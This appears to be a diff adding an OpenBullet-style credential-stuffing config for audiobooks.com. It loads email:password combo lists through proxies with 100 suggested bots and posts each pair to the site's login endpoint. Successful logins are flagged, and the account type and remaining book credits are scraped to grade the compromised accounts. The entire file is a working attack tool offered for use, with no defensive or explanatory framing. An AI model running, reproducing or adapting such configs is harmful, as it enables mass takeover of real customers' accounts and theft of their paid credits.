@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "AudioBooks",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-22T01:32:19.2662248+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.audiobooks.com/login/authenticate" AutoRedirect=TRUE 
+  CONTENT "ajax=true&loginEmail=<USER>&loginPassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: UQQOU1JACgQAUVFW" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "origin: https://www.audiobooks.com" 
+  HEADER "referer: https://www.audiobooks.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":\"failure" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success" 
+#My_Account REQUEST GET "https://www.audiobooks.com/account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_acc_type PARSE "<SOURCE>" LR "<h2 class=\"\">Account Type</h2>
+
+            <div class=\"left-block\">
+            <p>" "</p>" Recursive=FALSE -> CAP "Account Type" "" "" 
+#PARSE_Book_Credits PARSE "<SOURCE>" LR "div class=\"\"><p class=\"remaining-credits\">" "</p>" Recursive=FALSE -> CAP "Book Credits" "" "" 
